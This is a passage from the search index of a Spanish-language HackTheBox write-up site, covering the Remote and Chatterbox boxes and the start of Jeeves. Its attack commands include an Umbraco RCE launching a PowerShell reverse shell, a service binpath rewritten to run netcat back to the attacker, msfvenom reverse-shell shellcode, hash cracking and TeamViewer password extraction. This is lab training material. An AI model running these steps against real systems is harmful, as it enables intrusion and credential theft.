manera autom\u00e1tica mediante:</p> <pre><code>ffuf -c -ic -u http://10.10.10.180/FUZZ -w /usr/share/dirb/wordlists/common.txt\n</code></pre> <p>Encontrando as\u00ed el directorio <code>umbraco</code> el cual no pareci\u00f3 com\u00fan bajo el contexto del sitio.</p> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#manual","title":"Manual","text":"<p>Al navegar manualmente al directorio se visualiz\u00f3 un login, a lo que posteriormente se busc\u00f3 informaci\u00f3n relacionada encontrando que se trataba de un sistema de gestor de contenidos (CMS).</p> <p></p> <p>Al buscar rutas de explotaci\u00f3n se encontr\u00f3 un exploit (junto con su repositorio) el cu\u00e1l para ser ejecutado se requiere contar con credenciales v\u00e1lidas, abriendo paso a dos consideraciones de camino a la fase de explotaci\u00f3n:</p> <ul> <li>Realizar b\u00fasqueda de credenciales por alg\u00fan sitio (preferente).</li> <li>Realizar fuerza bruta al login (siempre \u00faltimo recurso).</li> </ul>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#mountd-2049","title":"mountd - 2049","text":"<p>Al identificar el servicio y encontrar que se trataba de exposici\u00f3n de puntos de montaje a trav\u00e9s de red, se hizo uso de <code>showmount -e 10.10.10.180</code> visualizando as\u00ed el montaje <code>site_backups</code>.</p> <p></p> <p>Posteriormente, para poder navegar a trav\u00e9s del directorio e interactuar c\u00f3modamente se cre\u00f3 la carpeta <code>/mnt/remote</code> y se ejecut\u00f3:</p> <pre><code>sudo mount -t nfs 10.10.10.180:site_backups /mnt/remote -o nolock\n</code></pre> <p>Para montar ah\u00ed lo expuesto en el servidor.</p> <p>Teniendo en consideraci\u00f3n la b\u00fasqueda de credenciales, se buscaron patrones en texto claro en el punto de montaje.</p> <p></p> <p>Al buscar en los contenidos de los archivos se\u00f1alados (los que resultaron m\u00e1s atractivos) se encontr\u00f3 en el archivo <code>UmbracoTraceLog.intranet.txt</code> un usuario potencial que se utiliz\u00f3 para continuar con la b\u00fasqueda de informaci\u00f3n.</p> <p></p> <p>Utilizando lo encontrado, se procedi\u00f3 a hacer otra b\u00fasqueda descartando as\u00ed m\u00faltiples archivos permitiendo verificar otros que con anterioridad no se revisaron.</p> <p></p> <p>Al ser interpretado como binario, se uso:</p> <pre><code>strings Umbraco.pdf\n</code></pre> <p>Para interpretar los caracteres legibles identificando as\u00ed las credenciales <code>admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa</code>.</p> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#cracking-de-hash-obtenido","title":"Cracking de hash obtenido","text":"<p>Guardando el hash del usuario admin en un archivo y haciendo uso de:</p> <pre><code>john hashes --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> <p>Se obtuvo la contrase\u00f1a <code>admin@htb.local:baconandcheese</code>.</p> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#rce","title":"RCE","text":"<p>Despu\u00e9s de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecut\u00f3:</p> <pre><code>python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami\n</code></pre> <p>Para corroborar su uso.</p> <p></p> <p>Haciendo uso de Reverse Shell Generator se gener\u00f3 una reverse shell de powershell en base64 para entablar la conexi\u00f3n con:</p> <pre><code>python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAg[...]'\n</code></pre> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de:</p> <pre><code>whoami /all\n</code></pre> <p>Se visualiz\u00f3 que el privilegio <code>SeImpersonatePrivilege</code> se encuentra habilitado, permitiendo su explotaci\u00f3n haciendo uso de Rotten/JuicyPotato.</p> <p></p> <p>Por medio de winPEAS se encontr\u00f3 que el servicio de <code>TeamViewer</code> se encuentra habilitado y ejecut\u00e1ndose. Concordando de alguna forma con el nombre de la m\u00e1quina.</p> <p></p> <p>Posteriormente, se realiz\u00f3 una b\u00fasqueda sobre los exploits disponibles sobre TeamViewer encontrando los siguientes.</p> <p></p> <p>En donde por curiosidad se tom\u00f3 en consideraci\u00f3n la exposici\u00f3n de credenciales y b\u00fascando m\u00e1s informaci\u00f3n al respecto se encontr\u00f3 el m\u00f3dulo de metasploit <code>windows/gather/credentials/teamviewer_passwords</code> y un repositorio en conjunto con su art\u00edculo en donde se realiza una PoC para descifrar las credenciales alojadas en registros de Windows.</p> <p>Tambi\u00e9n dentro de la salida de <code>winPEAS</code> se visualiza que se cuenta con acceso completo al servicio <code>UsoSvc</code>, lo que permitir\u00eda modificar las opciones del servicio y detener o iniciar su ejecuci\u00f3n.</p> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#iis-apppool-nt-authority-system","title":"iis apppool \u2192 nt authority system","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#teamviewer","title":"TeamViewer","text":"<p>Al subir el script de powershell a la m\u00e1quina, cargarlo como m\u00f3dulo en la sesi\u00f3n con <code>Import-Module</code> y ejecutar la funci\u00f3n de extraci\u00f3n <code>Get-TeamViewPasswords</code>, se descifr\u00f3 la contrase\u00f1a <code>!R3m0te!</code>.</p> <p></p> <p>El mismo proceso puede ser realizado con el m\u00f3dulo de metasploit, sin embargo, es necesario tener una sesi\u00f3n abierta preferentemente de meterpreter (al tiempo que se resolvi\u00f3 la m\u00e1quina el payload ejecutado fue <code>windows/meterpreter_reverse_tcp</code>)</p> <p>Probando posteriormente la contrase\u00f1a con el usuario Administrator mediante:</p> <pre><code>impacket-psexec 'Administrator:!R3m0te!@10.10.10.180'\n</code></pre> <p>Obteniendo as\u00ed acceso como <code>NT AUTHORITY\\SYSTEM</code>.</p> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#modificacion-de-servicios","title":"Modificaci\u00f3n de servicios","text":"<p>Mediante:</p> <pre><code>sc.exe qc UsoSvc\n</code></pre> <p>Se puede ver m\u00e1s a detalle informaci\u00f3n respecto este servicio.</p> <p></p> <p>Por lo que haciendo uso de:</p> <pre><code>sc.exe config UsoSvc binpath=\"c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.16 4321\"\n</code></pre> <p>Se busc\u00f3 la modificaci\u00f3n de la ruta del binario a ejecutar sustituy\u00e9ndola con la ejecuci\u00f3n de netcat para entablar una reverse shell. Al consultar de nuevo la informaci\u00f3n del servicio, se observa la modificaci\u00f3n del valor.</p> <p></p> <p>Por consiguiente al poner la conexi\u00f3n a la escucha y  realizar un reinicio del servicio con:</p> <pre><code>net stop UsoSvc &amp;&amp; net start UsoSvc\n</code></pre> <p>Se logr\u00f3 tener acceso como <code>NT AUTHORITY\\SYSTEM</code> satisfactoriamente.</p> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#juicypotato","title":"JuicyPotato","text":"<p>Debido al no tener \u00e9xito al aprovecharse del privilegio ni con el uso de JuicyPotato ni con PrintSpoofer se busc\u00f3 corroborar con el writeup oficial, el cu\u00e1l indica que deber\u00eda ser v\u00e1lido el m\u00e9todo, sin embargo, no se logr\u00f3 satisfactoriamente.</p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#referencias","title":"Referencias","text":"<ul> <li>Exploit de Umbraco.</li> <li>Github - Exploit de Umbraco.</li> <li>HackTricks - Pentesting NFS Service.</li> <li>Microsoft - Importaci\u00f3n de m\u00f3dulo en powershell.</li> <li>Github - Descifrado de contrase\u00f1as TeamViewer.</li> <li>Descrifrado de contrase\u00f1as TeamViewer post de blog.</li> <li>HackTricks - Local Privilege Escalation - Services.</li> </ul>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/","title":"Chatterbox","text":"<p>Write-up de la m\u00e1quina Chatterbox de HackTheBox.</p> <p></p>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>achat - 9255, 9256</li> <li>Manual</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>Buffer Overflow - RCE<ul> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>alfred \u2192 nt authority system</li> </ul> </li> <li>Referencias</li> </ul>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Chatterbox OS Windows Dificultad oficial Medium Dificultad de comunidad Puntos 30 Creadores lkys37en","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#reconocimiento","title":"Reconocimiento","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:36 EDT\nInitiating Connect Scan at 13:36\nScanning 10.10.10.74 [65535 ports]\nDiscovered open port 135/tcp on 10.10.10.74\nDiscovered open port 139/tcp on 10.10.10.74\nDiscovered open port 445/tcp on 10.10.10.74\nDiscovered open port 49152/tcp on 10.10.10.74\nDiscovered open port 49154/tcp on 10.10.10.74\nDiscovered open port 9256/tcp on 10.10.10.74\nDiscovered open port 49153/tcp on 10.10.10.74\nDiscovered open port 9255/tcp on 10.10.10.74\nDiscovered open port 49155/tcp on 10.10.10.74\nDiscovered open port 49157/tcp on 10.10.10.74\nDiscovered open port 49156/tcp on 10.10.10.74\nCompleted Connect Scan at 13:37, 29.11s elapsed (65535 total ports)\nNmap scan report for 10.10.10.74\nHost is up, received user-set (0.073s latency).\nScanned at 2022-05-27 13:36:42 EDT for 29s\nNot shown: 54223 closed tcp ports (conn-refused), 11301 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      REASON\n135/tcp   open  msrpc        syn-ack\n139/tcp   open  netbios-ssn  syn-ack\n445/tcp   open  microsoft-ds syn-ack\n9255/tcp  open  mon          syn-ack\n9256/tcp  open  unknown      syn-ack\n49152/tcp open  unknown      syn-ack\n49153/tcp open  unknown      syn-ack\n49154/tcp open  unknown      syn-ack\n49155/tcp open  unknown      syn-ack\n49156/tcp open  unknown      syn-ack\n49157/tcp open  unknown      syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 29.15 seconds\n</code></pre>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:39 EDT\nNmap scan report for 10.10.10.74\nHost is up (0.074s latency).\n\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n9255/tcp  open  http         AChat chat system httpd\n|_http-server-header: AChat\n|_http-title: Site doesn't have a title.\n9256/tcp  open  achat        AChat chat system\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nService Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s\n| smb2-time:\n|   date: 2022-05-27T22:40:43\n|_  start_date: 2022-05-27T22:34:47\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.1:\n|_    Message signing enabled but not required\n| smb-os-discovery:\n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: Chatterbox\n|   NetBIOS computer name: CHATTERBOX\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2022-05-27T18:40:47-04:00\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 70.63 seconds\n</code></pre>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#servicios","title":"Servicios","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#achat-9255-9256","title":"achat - 9255, 9256","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#manual","title":"Manual","text":"<p>Al buscar hacer un reconocimiento directamente por alguna versi\u00f3n vulnerable se encontr\u00f3 este repositorio en github de una prueba de concepto sobre la explotaci\u00f3n del programa, probado en su versi\u00f3n y arquitectura <code>AChat 0.150 Beta 7 Windows 7/8/10 x86/x64</code>. Por lo que directamente se prob\u00f3 el exploit.</p>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#buffer-overflow-rce","title":"Buffer Overflow - RCE","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#pasos-previos-preparacion","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Dadas las indicaciones en la PoC se gener\u00f3 el shellcode correspondiente usando:</p> <pre><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=10.10.14.16 LPORT=4321 exitfunc=thread -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python &gt; scode.txt\n</code></pre> <p>Sustituyendo los valores correspondientes en el script del shellcode y host.</p>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#ejecucion","title":"Ejecuci\u00f3n","text":"<p>Obteniendo acceso como el usuario <code>alfred</code>.</p> <p></p>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Posteriormente al ejecutar winPEAS, se identificaron dos rutas potenciales a probar:</p> <ol> <li>El usuario con el que se cuenta (alfred) tiene acceso completo al directorio del usuario Administrator.</li> <li>Existen credenciales AutoLogon visibles.</li> </ol> <p></p>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#alfred-nt-authority-system","title":"alfred \u2192 nt authority system","text":"<p>En el primer caso, bastar\u00eda con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastar\u00eda con hacer uso de <code>icacls</code> para efectuar el cambio de permisos lo cual por herencia o jerarqu\u00eda del directorio, se permitir\u00eda este cambio pudiendo as\u00ed leer la bandera de <code>root.txt</code>.</p> <p>Por medio de:</p> <pre><code>icacls .\\root.txt /e /p alfred:f\n</code></pre> <p>Tomando como referencia este post para verificar el uso del binario.</p> <p></p> <p>En el segundo caso, al probar alguna herramienta que permita acceso al sistema con credenciales como <code>psexec</code> se puede obtener una shell como <code>NT AUTHORITY SYSTEM</code>, probando las credenciales obtenidas anteriormente bajo la suposici\u00f3n de reutilizaci\u00f3n de contrase\u00f1a.</p> <p>Ejecutando:</p> <pre><code>impacket-psexec 'Administrator:Welcome1!@10.10.10.74'\n</code></pre> <p></p>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/#referencias","title":"Referencias","text":"<ul> <li>AChat expoit.</li> <li>Windows change access permissions from the command line.</li> </ul>","tags":["Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","Generating a Shellcode based on our needs + TIPS","Icacls Abuse (Privilege Escalation)","PowerUp Enumeration (Alternative Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/","title":"Jeeves","text":"<p>Write-up de la m\u00e1quina Jeeves de HackTheBox.</p> <p></p>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 80</li> <li>http - 50000</li> <li>Manual</li> <li>ffuf</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>RCE 1<ul> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>RCE 2<ul> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>kohsuke \u2192 nt authority\\system</li> <li>JuicyPotato</li> <li>KeePass</li> <li>Obtenci\u00f3n de bandera</li> </ul> </li> <li>Referencias</li> </ul>","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Jeeves OS Windows Dificultad oficial Medium Dificultad de comunidad Puntos 30 Creadores mrb3n","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#reconocimiento","title":"Reconocimiento","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Jenkins Exploitation (Groovy Script Console)","Abusing SeImpersonatePrivilege","PassTheHash (Psexec)","Breaking KeePass","Alternate Data Streams (ADS)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Jeeves/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 20:08 EDT\nInitiating Connect Scan at 20:08\nScanning 10.10.10.63 [65535 ports]\nDiscovered open port 80/tcp on 10.10.10.63\nDiscovered open port 445/tcp on 10.10.10.63\nDiscovered open port 135/tcp on 10.10.10.63\nConnect 